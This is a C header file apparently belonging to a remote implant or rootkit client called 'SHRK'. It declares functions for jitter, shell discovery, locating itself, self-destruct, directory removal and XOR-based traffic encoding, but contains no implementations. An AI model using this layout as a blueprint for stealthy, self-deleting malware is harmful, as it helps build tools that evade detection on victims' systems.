#pragma once
#include <stdbool.h>

#include <stdint.h>
#include <string.h>

#include <errno.h>
#include <netdb.h>

#define CLIENT_KEY_SIZE     12
#define ENCODED_BYTE_SIZE   2
#define ENCRYPTED_BYTE_SIZE 1

#if SHRK_DEBUG
#define debug(f, ...)     print_debug(__func__, f, ##__VA_ARGS__)
#define debug_err(f, ...) print_debug(__func__, f ": %s", ##__VA_ARGS__, strerror(errno))
#else
#define debug(...)     asm("nop;")
#define debug_err(...) asm("nop;")
#endif

#if SHRK_DEBUG_DUMP
#define debug_dump(buf, size) print_debug_dump(__func__, buf, size)
#else
#define debug_dump(buf, size) asm("nop;")
#endif

void print_debug(const char *func, const char *msg, ...);
void print_debug_dump(const char *func, uint8_t *buf, uint16_t size);

bool     resolve(struct addrinfo *info, struct sockaddr *saddr, char *addr, uint16_t port);
uint64_t copy(void *dst, void *src, uint64_t size);
char    *get_distro();
void     jitter();

void     randseed();
uint64_t randint(uint64_t min, uint64_t max);

bool  remove_dir(char *path);
bool  path_find(char *executable);
char *shell_find();
char *get_self(char *path);

void self_destruct();

uint64_t encode(char *s, uint64_t l);
uint64_t decode(char *s, uint64_t l);

uint64_t xorck(char *s, uint64_t l);
#define encrypt(s, l) (xorck(s, l))
#define decrypt(s, l) (xorck(s, l))
